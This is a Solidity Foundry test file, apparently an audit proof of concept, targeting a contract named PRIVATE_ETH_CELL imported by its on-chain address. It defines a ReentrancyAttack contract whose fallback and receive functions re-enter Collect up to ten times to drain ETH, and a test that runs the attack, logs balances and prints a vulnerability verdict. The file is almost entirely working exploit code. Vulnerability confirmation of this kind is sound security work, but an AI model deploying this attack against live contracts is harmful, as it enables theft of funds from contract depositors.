// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";

contract MockLogFile {
    struct Message {
        address Sender;
        uint Time;
        uint Val;
        string Data;
    }
    
    Message public LastMsg;
    Message[] public History;

    function AddMessage(address _adr, uint _val, string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}

contract ReentrancyAttack {
    PRIVATE_ETH_CELL private target;
    uint256 public attackCount;
    uint256 public attackAmount;

    constructor(address payable _target) {
        target = PRIVATE_ETH_CELL(_target);
    }

    function deposit() external payable {
        target.Deposit{value: msg.value}();
    }

    function attack(uint256 _amount) external {
        attackAmount = _amount;
        target.Collect(_amount);
    }

    fallback() external payable {
        if (address(target).balance >= attackAmount && attackCount < 10) {
            attackCount++;
            target.Collect(attackAmount);
        }
    }

    receive() external payable {
        if (address(target).balance >=attackAmount && attackCount < 10) {
            attackCount++;
            target.Collect(attackAmount);
        }
    }
}

contract PRIVATE_ETH_CELLTest is Test {
    PRIVATE_ETH_CELL private cell;
    MockLogFile private mockLog;
    ReentrancyAttack private attacker;
    address private owner = makeAddr("owner");

    function setUp() public {
        vm.deal(owner, 100 ether);
        
        // Deploy mock log file
        mockLog = new MockLogFile();
        
        vm.startPrank(owner);
        cell = new PRIVATE_ETH_CELL();
        cell.SetMinSum(1 ether);
        cell.SetLogFile(address(mockLog));
        cell.Initialized();
        vm.stopPrank();

        attacker = new ReentrancyAttack(payable(address(cell)));
        vm.deal(address(attacker), 10 ether);
    }

    function testReentrancyAttack() public {
        // Attacker deposits funds
        vm.prank(address(attacker));
        attacker.deposit{value: 5 ether}();

        console2.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(cell).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackCountBefore = attacker.attackCount();
        console2.log("Contract ETH Balance Before:", contractBalanceBefore);
        console2.log("Attacker ETH Balance Before:", attackerBalanceBefore);
        console2.log("Attack Count Before:", attackCountBefore);

        console2.log("--- Trigger Reentrancy Attack ---");
        vm.prank(address(attacker));
        attacker.attack(1 ether);

        console2.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(cell).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackCountAfter = attacker.attackCount();
        console2.log("Contract ETH Balance After:", contractBalanceAfter);
        console2.log("Attacker ETH Balance After:", attackerBalanceAfter);
        console2.log("Attack Count After:", attackCountAfter);

        uint256 contractBalanceDiff = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerBalanceDiff = attackerBalanceAfter - attackerBalanceBefore;
        uint256 attackCountDiff = attackCountAfter - attackCountBefore;
        console2.log("Contract Balance Reduction:", contractBalanceDiff);
        console2.log("Attacker Balance Increase:", attackerBalanceDiff);
        console2.log("Attack Count Increase:", attackCountDiff);

        // Vulnerability check (reentrancy confirmed if contract lost >1 ether and attackCount increased)
        bool vulnerabilityExists = attackCountDiff > 0 && contractBalanceDiff > 1 ether;
        if (vulnerabilityExists) {
            console2.log("VULNERABILITY EXISTS: Reentrancy attack succeeded with multiple withdrawals");
            console2.log("--- Final Verdict ---");
            console2.log("Vulnerability Exists: Reentrancy vulnerability leading to multiple unauthorized ETH withdrawals");
        } else {
            console2.log("VULNERABILITY NOT DETECTED: No evidence of successful reentrancy attack");
            console2.log("--- Final Verdict ---");
            console2.log("Vulnerability not Exist: Contract balances show no evidence of improper multiple withdrawals");
        }
    }
}